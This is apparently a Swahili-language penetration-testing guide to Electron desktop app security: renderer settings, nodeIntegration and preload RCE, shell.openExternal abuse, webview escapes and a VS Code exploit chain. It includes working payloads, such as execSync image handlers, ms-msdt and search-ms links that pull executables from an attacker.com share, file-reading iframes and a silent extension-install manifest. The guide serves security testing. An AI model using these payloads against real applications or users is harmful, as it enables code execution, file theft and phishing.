# Programu za Desktop za Electron

{{#include ../../banners/hacktricks-training.md}}

## Utangulizi

Electron huunganisha main process ya **Node.js** yenye mamlaka ya juu na renderer processes za **Chromium**. Electron si kivinjari cha wavuti: msimbo wa programu unaweza kufichua kimakusudi uwezo kama ufikiaji wa mfumo wa faili na shell, kwa hivyo kupakia maudhui yasiyoaminika kunahitaji usanifu mkali zaidi wa mipaka kuliko tovuti ya kawaida.<sup>[[21]](#references)</sup>

Msimbo wa programu za Electron kwa kawaida hufungwa kwenye archive ya `.asar`. Itoe kabla ya kukagua source:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

`package.json` ya programu hutambua sehemu yake kuu ya kuanzia. Faili hiyo kwa kawaida huunda madirisha ya renderer na kuweka `webPreferences` zake zinazohusu usalama.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron ina aina mbili kuu za process:

- Main Process (ina ufikiaji kamili wa NodeJS)
- Renderer Process (inapaswa kuwa na ufikiaji wenye vizuizi wa NodeJS kwa sababu za usalama)

![Programu za Electron za Desktop - Utangulizi: Renderer Process (inapaswa kuwa na ufikiaji wenye vizuizi wa NodeJS kwa sababu za usalama)](<../../images/image (182).png>)

**Renderer process** huwa dirisha la kivinjari linalopakia faili:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

**main process** husanidi kila renderer process, kwa kawaida wakati wa kuunda `BrowserWindow`. Mipangilio salama hupunguza uwezekano wa renderer iliyohujumiwa kusababisha utekelezaji wa native code, lakini haifanyi maudhui yasiyoaminika kuwa salama kiasili.<sup>[[21]](#references)[[22]](#references)</sup>

Kagua angalau mapendeleo haya ya renderer:<sup>[[22]](#references)</sup>

- **`nodeIntegration`** ni `false` kwa chaguo-msingi. Kuiwezesha huipa JavaScript ya renderer ufikiaji wa Node.js APIs na pia huzima sandbox ya renderer hiyo.
- **`contextIsolation`** ni `true` kwa chaguo-msingi. Hutenganisha muktadha wa JavaScript wa ukurasa na muktadha unaotumiwa na preload scripts na Electron internals.
- **`preload`** haina njia ya chaguo-msingi. Preload script iliyosanidiwa huendeshwa kabla ya page scripts na inaweza kufichua APIs zenye upeo finyu kupitia `contextBridge`.
- **`sandbox`** ni `true` kwa chaguo-msingi tangu Electron 20. Huzuia renderer kufikia rasilimali za mfumo wa uendeshaji; kuweka `nodeIntegration: true` huizima.
- **`nodeIntegrationInWorker`** ni `false` kwa chaguo-msingi na hudhibiti Node.js integration katika Web Workers.
- **`nodeIntegrationInSubFrames`** ni `false` kwa chaguo-msingi.
  - Ikiwa **`nodeIntegration`** **imewezeshwa**, hii ingeruhusu matumizi ya **Node.js APIs** katika kurasa za wavuti **zilizopakiwa ndani ya iframes** katika programu ya Electron.
  - Ikiwa **`nodeIntegration`** **imezimwa**, basi preloads zitapakiwa ndani ya iframe

Mfano wa usanidi:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

Baadhi ya **RCE payloads** kutoka [hapa](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Nasa trafiki

Rekebisha usanidi wa start-main na uongeze matumizi ya proxy kama vile:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## Ufuatiliaji tuli wa mpaka wa ASAR-kwa-native kwa kutumia REA

**REA** inaweza kusoma ASAR au saraka ya programu iliyotolewa bila kutekeleza bootstrap yake ya JavaScript. Grafu ya programu yake huhifadhi sehemu za kuingilia za package, modules zilizofungwa pamoja, mipangilio ya `BrowserWindow` na preload, washiriki wa `contextBridge`, usajili wa IPC, maombi ya native add-on na vitambulisho vya source map. Hii hutoa mwanzo wa kufuatilia uwezo unaoonyeshwa kwa renderer hadi kwenye handler yenye upendeleo ya main process.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

Kwa string ya kipengele halisi, pitisha rekodi kamili ya Evidence kama `application` na ubadilishe seed kwa moja iliyoonekana kwenye target:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

Mtiririko uleule wa `trace_application_feature` pia hukubali mwanachama halisi wa API, chaneli ya IPC au moduli iliyoonekana kama seed. Kagua njia ya handler inayotokana, wagombea wa uthibitishaji na native handoff kulingana na maeneo ya source yaliyorudishwa. `invoke` ya renderer huunganishwa tu na mgombea mmoja wa kipekee wa `ipcMain.handle`/`handleOnce` kwenye channel halisi ileile; `send` vilevile huhitaji mgombea mmoja wa kipekee wa `ipcMain.on`/`once`/`addListener`. Handlers zinazobadilika au zilizo maradufu hubaki bila kutatuliwa. Mwanachama wa `.node` aliyeombwa si native export iliyothibitishwa; ushahidi unaolingana wa Hopper/Ghidra lazima uwe na digest ileile ya artifact kabla ya kufikia hitimisho hilo. Kufikika kwa njia kwa uchanganuzi tuli pia hakuthibitishi kwamba njia hiyo ilitekelezwa.<sup>[[24]](#references)[[25]](#references)</sup>

Kwa mpaka wa uaminifu wa renderer-to-main na uthibitishaji wa handler, tazama [Electron contextIsolation RCE via IPC](electron-contextisolation-rce-via-ipc.md).

Kwa ufuatiliaji wa native unaotegemea provider, tazama [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea).

## Attack surface ya auto-update ya Electron

Kwa uadilifu wa release-feed, rollback, mkanganyiko wa signed-channel na TOCTOU ya staging-file, tazama [Electron auto-update trust boundaries](electron-auto-update-trust-boundaries.md).

## Electron Local Code Injection

Ukiwa na ufikiaji wa kuandika ndani au kufanya instrumentation kwenye app iliyosakinishwa, tazama [Electron local code injection and snapshot tampering](electron-local-code-injection-and-snapshot-tampering.md) kwa njia za ASAR/main-process na V8 snapshot, pamoja na viungo vinavyohusu OS.

## RCE: XSS + nodeIntegration

Ikiwa **nodeIntegration** imewekwa kuwa **on**, JavaScript ya ukurasa wa wavuti inaweza kutumia vipengele vya Node.js kwa urahisi kwa kuita tu `require()`. Kwa mfano, njia ya kuendesha programu ya calc kwenye Windows ni:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Scripti iliyobainishwa katika mpangilio huu **hupakiwa kabla ya scripti nyingine kwenye renderer**, kwa hivyo ina **ufikiaji usio na kikomo wa Node APIs**:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Kwa hivyo, script inaweza kuhamisha node-features kwenye kurasa:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **Ikiwa `contextIsolation` imewashwa, hii haitafanya kazi**

## RCE: XSS + contextIsolation

_**contextIsolation**_ huleta **muktadha tofauti kati ya script za ukurasa wa wavuti na code ya ndani ya JavaScript ya Electron**, ili utekelezaji wa JavaScript wa kila code usiathiri mwingine. Hiki ni kipengele muhimu cha kuondoa uwezekano wa RCE.

Ikiwa miktadha haijatenganishwa, mshambuliaji anaweza:

1. Kutekeleza **JavaScript yoyote kwenye renderer** (XSS au kuelekeza kwenye tovuti za nje)
2. **Kubadilisha method iliyojengewa ndani** inayotumiwa kwenye preload au code ya ndani ya Electron na kuweka function yake mwenyewe
3. **Kusababisha** matumizi ya **function iliyobadilishwa**
4. RCE?

Kuna sehemu 2 ambapo method zilizojengewa ndani zinaweza kubadilishwa: kwenye code ya preload au code ya ndani ya Electron:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Kukwepa tukio la kubofya

Ikiwa kuna vizuizi vinavyotumika unapobofya kiungo, unaweza kuvipita **kwa kubofya kitufe cha kati cha kipanya** badala ya kubofya kitufe cha kushoto kawaida

```javascript
window.addEventListener('click', (e) => {
```

## RCE kupitia shell.openExternal

Kwa maelezo zaidi kuhusu mifano hii, angalia [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) na [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

Unapoweka programu ya Electron ya desktop, ni muhimu kuhakikisha mipangilio sahihi ya `nodeIntegration` na `contextIsolation`. Imebainika kuwa mipangilio hii huzuia ipasavyo **utekelezaji wa msimbo wa mbali (RCE) upande wa mteja** unaolenga preload scripts au msimbo asilia wa Electron kutoka kwenye main process.

Mtumiaji anapobofya viungo au kufungua madirisha mapya, event listeners mahususi huwashwa; ni muhimu kwa usalama na utendakazi wa programu:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

Listeners hizi **hubadilishwa na application ya desktop** ili kutekeleza **mantiki yake ya biashara**. Application hutathmini ikiwa kiungo kilichofunguliwa kinapaswa kufunguliwa ndani ya application au katika kivinjari cha wavuti cha nje. Uamuzi huu kwa kawaida hufanywa kupitia function, `openInternally`. Ikiwa function hii itarudisha `false`, inaashiria kwamba kiungo kinapaswa kufunguliwa nje, kwa kutumia function ya `shell.openExternal`.

**Huu hapa ni pseudocode rahisi:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Mbinu bora za usalama za Electron JS zinashauri kutokubali maudhui yasiyoaminika kwa kutumia function ya `openExternal`, kwani hilo linaweza kusababisha RCE kupitia protocols mbalimbali. Mifumo ya uendeshaji hutumia protocols tofauti zinazoweza kusababisha RCE. Kwa mifano ya kina na maelezo zaidi kuhusu mada hii, unaweza kurejelea [nyenzo hii](https://positive.security/blog/url-open-rce#windows-10-19042), inayojumuisha mifano ya Windows protocols zinazoweza kutumia vibaya athari hii.<sup>[[10]](#references)</sup>

Katika macos, function ya `openExternal` inaweza kutumiwa vibaya kutekeleza commands kiholela, kama vile `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Mifano ya Windows protocol exploits ni pamoja na:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Udhaifu huu unaweza kupatikana kwenye **[ripoti hii](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.<sup>[[11]](#references)</sup>

**webviewTag** ni **kipengele kilichopitwa na wakati** kinachoruhusu matumizi ya **NodeJS** katika **renderer process**. Kinapaswa kuzimwa kwa kuwa kinaruhusu kupakia script ndani ya muktadha wa preload kama vile:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Kwa hivyo, mshambulizi anayefaulu kupakia ukurasa wowote angeweza kutumia tag hiyo **kupakia preload script yoyote**.

Kisha preload script hii ilitumiwa vibaya kuita **huduma ya IPC iliyo hatarini (`skype-new-window`)**, ambayo iliita **`shell.openExternal`** na kusababisha RCE:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Kusoma Faili za Ndani: XSS + contextIsolation

**Kuzima `contextIsolation` huwezesha matumizi ya tagi za `<webview>`**, sawa na `<iframe>`, ili kusoma na kufanya exfiltration ya faili za ndani. Mfano uliotolewa unaonyesha jinsi ya kutumia vulnerability hii kusoma yaliyomo kwenye faili za ndani:<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - Kusoma Faili za Ndani: XSS + contextIsolation: Kuzima contextIsolation huwezesha matumizi ya tagi , sawa na , kwa...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Zaidi ya hayo, njia nyingine ya **kusoma faili ya ndani** imeshirikiwa, ikionyesha vulnerability muhimu ya kusoma faili za ndani katika desktop app ya Electron. Hii inahusisha kuingiza script ili kutumia application na kufanya exfiltration ya data:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + Chromium ya Zamani**

Ikiwa toleo la **Chromium** lililojumuishwa kwenye programu ni la zamani na lina udhaifu unaojulikana, huenda ikawezekana kulitumia na kubadilisha XSS kuwa RCE.<sup>[[20]](#references)</sup>\
Unaweza kuona mfano katika **writeup** hii: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **XSS Phishing kupitia Internal URL regex bypass**

Ukipata XSS lakini **huwezi kusababisha RCE au kuiba faili za ndani**, bado unaweza kujaribu **kuiba credentials kupitia phishing**.<sup>[[1]](#references)</sup>

Kwanza, kagua code ya frontend ili kubaini kinachotokea URL mpya inapofunguliwa:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

Wito wa **`openInternally`** huamua ikiwa kiungo cha jukwaa kitafunguliwa katika **dirisha la desktop** au rasilimali ya mtu mwingine itafunguliwa kwenye kivinjari cha mfumo.

Ikiwa regex ya orodha ya URL zinazoruhusiwa ya function inaweza kukwepwa—kwa mfano, kwa sababu nukta katika hostname hazikuwekewa escape—mshambuliaji anaweza kutumia XSS kufungua kidokezo cha kuingiza taarifa za kuingia kinachoaminika kwenye miundombinu inayodhibitiwa na mshambuliaji:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## Itifaki ya `file://`

Kama ilivyotajwa kwenye [mwongozo wa usalama wa Electron](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), kurasa zinazoendeshwa kupitia **`file://`** hupata ufikiaji mpana wa faili. Kwa hiyo, **XSS inaweza kutumika kupakia faili zozote** kutoka kwenye mashine ya mtumiaji. **Custom protocol** iliyoundwa ipasavyo inaweza kuzuia ufikiaji kwa seti mahususi ya faili.<sup>[[21]](#references)</sup>

## Moduli ya remote

Moduli ya Electron Remote huruhusu **renderer processes kufikia main process APIs**, na kurahisisha mawasiliano ndani ya programu ya Electron. Hata hivyo, kuwezesha moduli hii huleta hatari kubwa za usalama. Hupanua eneo la mashambulizi la programu, na kuifanya iwe katika hatari zaidi ya udhaifu kama vile mashambulizi ya cross-site scripting (XSS).

> [!TIP]
> Ingawa moduli ya **remote** hufichua baadhi ya APIs za main kwa renderer processes, si rahisi kupata RCE kwa kutumia vibaya vipengele hivyo pekee. Hata hivyo, vipengele hivyo vinaweza kufichua taarifa nyeti.

> [!WARNING]
> Programu nyingi ambazo bado zinatumia moduli ya remote hufanya hivyo kwa njia ambayo **inahitaji NodeIntegration iwezeshwe** katika renderer process, jambo ambalo ni **hatari kubwa sana ya usalama**.

Moduli ya `remote` iliyojumuishwa ndani ya Electron ilitangazwa kuwa imepitwa na wakati na baadaye ikaondolewa; programu ambazo bado zinahitaji mfumo wake zinaweza kutumia kifurushi tofauti cha `@electron/remote`. Kwa sababu ya athari zake kwa usalama na utendaji, epuka kufichua uwezo wa aina ya remote kwa renderers zisizoaminika.

Kwa kutumia `@electron/remote`, lazima kwanza **iandaliwe katika main process**:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

Mchakato wa renderer unaweza kisha kuingiza vitu kutoka kwenye moduli:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

Chapisho la **[blog](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** linaonyesha baadhi ya **functions** za kuvutia zinazotolewa na object **`app`** kutoka kwenye remote module:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - **Huwasha upya** programu kwa **kufunga** instance ya sasa na **kuanzisha** mpya. Ni muhimu kwa **masasisho ya programu** au **mabadiliko makubwa ya hali**.
- **`app.setAppLogsPath([path])`**  
   - **Hufafanua** au **huunda** directory ya kuhifadhi **app logs**. Logs zinaweza **kupatikana** au **kubadilishwa** kwa kutumia **`app.getPath()`** au **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - **Husajili** executable ya sasa kama **handler chaguomsingi** ya **protocol** maalum. Unaweza kutoa **path maalum** na **arguments** ikihitajika.
- **`app.setUserTasks(tasks)`**  
   - **Huongeza** tasks kwenye **kategoria ya Tasks** katika **Jump List** (kwenye Windows). Kila task inaweza kudhibiti jinsi programu **inavyoanzishwa** au **arguments** zinazopitishwa.
- **`app.importCertificate(options, callback)`**  
   - **Huingiza** **cheti cha PKCS#12** kwenye **certificate store** ya mfumo (Linux pekee). **Callback** inaweza kutumika kushughulikia matokeo.
- **`app.moveToApplicationsFolder([options])`**  
   - **Huhamisha** programu hadi kwenye **Applications folder** (kwenye macOS). Husaidia kuhakikisha **usakinishaji wa kawaida** kwa watumiaji wa Mac.
- **`app.setJumpList(categories)`**  
   - **Huweka** au **huondoa** **Jump List** maalum kwenye **Windows**. Unaweza kubainisha **categories** ili kupanga jinsi tasks zinavyoonyeshwa kwa mtumiaji.
- **`app.setLoginItemSettings(settings)`**  
   - **Husanidi** ni **executables** zipi zitaanzishwa **wakati wa kuingia**, pamoja na **options** zake (macOS na Windows pekee).
  
Mfano:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## module ya systemPreferences

**API kuu** ya kufikia mapendeleo ya mfumo na **kutuma matukio ya mfumo** katika Electron. Mbinu kama **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault**, na **setUserDefault** zote **ni sehemu ya** module hii.

**Mfano wa matumizi:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **Husikiliza** **arifa asili za macOS** kwa kutumia NSDistributedNotificationCenter.  
* Kabla ya **macOS Catalina**, ungeweza kunasa **arifa zote** zilizosambazwa kwa kupitisha **nil** kwa CFNotificationCenterAddObserver.  
* Baada ya **Catalina / Big Sur**, programu zilizowekwa kwenye sandbox bado zinaweza **kujisajili** kwa **matukio mengi** (kwa mfano, **kufunga/kufungua skrini**, **kuunganisha hifadhi**, **shughuli za mtandao**, n.k.) kwa kusajili arifa **kwa jina**.

### **getUserDefault / setUserDefault**

* **Huwasiliana** na **NSUserDefaults**, ambayo huhifadhi mapendeleo ya **programu** au **ulimwengu mzima** kwenye macOS.
    
* **getUserDefault** inaweza **kupata** taarifa nyeti, kama vile **mahali pa hivi karibuni pa faili** au **mahali pa kijiografia pa mtumiaji**.
    
* **setUserDefault** inaweza **kurekebisha** mapendeleo haya, na hivyo kuathiri **usanidi** wa programu.
    
* Katika **matoleo ya zamani ya Electron** (kabla ya v8.3.0), ni **mkusanyiko wa kawaida pekee** wa NSUserDefaults uliokuwa **unafikika**.

## Shell.showItemInFolder

Kazi hii huonyesha faili iliyotolewa kwenye kidhibiti faili. Kwenye mifumo na matoleo yaliyoathiriwa, mwingiliano huo **ungeweza kutekeleza faili kiotomatiki**.

Kwa maelezo zaidi angalia [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Sera ya Usalama wa Maudhui

Programu za Electron zinapaswa kuwa na **Sera ya Usalama wa Maudhui (CSP)** ili **kuzuia mashambulizi ya XSS**. **CSP** ni **kiwango cha usalama** kinachosaidia **kuzuia** **utekelezaji** wa **msimbo usioaminika** kwenye kivinjari.

Kwa kawaida **husanishwa** kwenye faili ya **`main.js`** au kiolezo cha **`index.html`**, ambapo CSP huwekwa ndani ya **meta tag**.

Kwa maelezo zaidi angalia:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: CSP ya Webview + uaminifu wa postMessage + upakiaji wa faili za ndani (VS Code 1.63)

Mnyororo huu wa mashambulizi ya ulimwengu halisi uliathiri Visual Studio Code 1.63 (CVE-2021-43908) na unaonyesha jinsi XSS moja inayoendeshwa na markdown kwenye webview inaweza kupandishwa hadi RCE kamili wakati CSP, postMessage, na washughulikiaji wa scheme zimesanidiwa vibaya. PoC ya umma: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Muhtasari wa mnyororo wa mashambulizi
- XSS ya kwanza kupitia CSP ya webview: CSP iliyozalishwa ilijumuisha `style-src 'self' 'unsafe-inline'`, na kuruhusu uingizaji wa msimbo kupitia inline/style katika muktadha wa `vscode-webview://`. Payload ilituma beacon kwa `/stealID` ili kutoa extensionId ya webview lengwa.
- Kuunda URL ya webview lengwa: Kutumia ID iliyovuja kuunda `vscode-webview://<extensionId>/.../<publicUrl>`.
- XSS ya pili kupitia uaminifu wa postMessage: Webview ya nje iliichukulia `window.postMessage` kuwa ya kuaminika bila ukaguzi mkali wa origin/type na kupakia HTML ya mshambuliaji kwa `allowScripts: true`.
- Upakiaji wa faili za ndani kupitia uandishi upya wa scheme/path: Payload iliandika upya `file:///...` kuwa `vscode-file://vscode-app/...` na kubadilisha `exploit.md` na `RCE.html`, ikitumia vibaya uthibitishaji dhaifu wa path ili kupakia rasilimali ya ndani yenye ruhusa za juu.
- RCE katika muktadha wenye Node: HTML iliyopakiwa ilitekelezwa huku API za Node zikiwa zinapatikana, na hivyo kuruhusu utekelezaji wa amri za OS.

Mfano wa primitive ya RCE katika muktadha wa mwisho
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

Usomaji unaohusiana kuhusu masuala ya uaminifu wa postMessage:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: njia za mkato ghushi za webview + madaraja ya amri za extension ya declarative

Aina tofauti ya escape ya VS Code webview ilijitokeza Juni 2026: **JavaScript isiyoaminika ndani ya notebook/preview webview ingeweza kuunda njia za mkato za kimataifa zenye mamlaka** kwa sababu preload ya webview ilisambaza data ya `keydown` kwa workbench ya host, nayo host ikaichukulia kama ingizo halisi la mtumiaji.<sup>[[14]](#references)</sup>

Hii ni sehemu ya historia pana ya mashambulizi dhidi ya mipaka ya uaminifu ya IDE, ambapo maudhui yanayodhibitiwa na mradi hufikia vipengele vya editor vyenye mamlaka.<sup>[[19]](#references)</sup>

### Hitilafu ya mpaka

Ikiwa webview ya cross-origin/sandboxed itanakili sehemu za kibodi zinazodhibitiwa na mshambuliaji (`key`, `code`, `keyCode`, modifiers, `repeat`) hadi kwenye daraja la `postMessage`/message-port lenye mamlaka **bila kukagua `event.isTrusted`**, JavaScript ndani ya webview inaweza kutekeleza njia za mkato za workbench kwa kutumia:<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

Hili ni muhimu hasa pale **uandishi wa kuiga unapozuiwa** na kivinjari. Matukio ya vitufe yaliyoandikwa kwa script kwa kawaida **hayawezi kuandika maandishi yoyote kwenye vipengele vya HTML `<input>`**, lakini bado huanzisha mikato ya vitufe inayoshughulikia moja kwa moja `keydown`.

### Miundo ya vitendo ya matumizi mabaya

- **Matumizi mabaya ya UI yanayolenga mikato ya vitufe:** lenga vifungo vya jumla kama kukubali arifa, kuvinjari palette, kuwezesha kitufe kilicholengwa, au kusogeza kwenye menyu badala ya kujaribu kuandika amri.
- **Vidokezo vya ruhusa vinavyotabirika kutokana na metadata ya workspace:** faili ya `.vscode/extensions.json` inayodhibitiwa na repository inaweza kupendekeza extension ya mshambuliaji na kuunda arifa ya usakinishaji inayotabirika, ambayo inaweza kukubaliwa kwa mkato wa vitufe kama `Ctrl+Shift+A`.
- **Manifest ya extension ya udeklarishaji kama daraja la amri:** hata kama msimbo wa extension ya workspace ya ndani umezuiwa na CSP katika VS Code ya wavuti, michango ya udeklarishaji ya `package.json` bado inaweza kupakiwa. Extension ya ndani iliyo chini ya `.vscode/extensions` inaweza kusajili keybinding inayoita `runCommands` na kisha amri ya ndani yenye ruhusa maalum kama `workbench.extensions.installExtension`.<sup>[[14]](#references)[[18]](#references)</sup>

Mfano wa muundo wa manifest:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **Alama za usalama zilizofichwa zinazofikiwa kupitia metadata isiyoaminika:** ikiwa amri ya ndani inakubali hoja zinazodhibitiwa na mshambuliaji kama `{"context":{"skipPublisherTrust":true}}`, metadata tangazaji inaweza kuficha kidirisha cha uthibitishaji wa uaminifu na kusakinisha kiendelezi kilichopangishwa kwenye Marketplace/CDN, ambacho hatimaye hutekeleza msimbo wa mshambuliaji.
- **Matumizi mabaya ya workspace zinazoaminika:** ikiwa workspace za mbali/tovuti zinaaminika kiotomatiki, viendelezi vya workspace za ndani huwa daraja lenye thamani kubwa kutoka kwenye maudhui ya hazina hadi kwenye vitendo vya mhariri vilivyo na ruhusa za juu.
- **Kupanua wigo baada ya kuathiriwa:** baada ya kiendelezi kutekelezwa, kagua tokeni ambazo mhariri huweka wazi kwa viendelezi. Katika `github.dev`, tokeni ya GitHub iliyoibwa ilikuwa halali nje ya hazina iliyofunguliwa, kwa hiyo kuuliza `https://api.github.com/user/repos` kuliorodhesha hazina nyingine za faragha zilizoweza kufikiwa.

### Maelezo ya ukaguzi

- Chukulia **usambazaji wa ingizo kutoka webview kwenda host** kama mpaka wa ruhusa; usitume tena matukio bandia ya kibodi/bofyo kutoka kwenye fremu zisizoaminika kwenda kwa host.
- Tekeleza uidhinishaji **ndani ya** amri nyeti. Usikubali muktadha wa amri uliotolewa na mpigaji unaoweza kuweka alama za ndani kama `skipPublisherTrust`.
- Usidhani kwamba kuzuia msimbo wa kiendelezi cha ndani unaoweza kutekelezwa kunatosha; kagua pia **michango tangazaji** (`keybindings`, `menus`, `commands`, tasks) kutoka kwenye manifest zinazodhibitiwa na workspace.
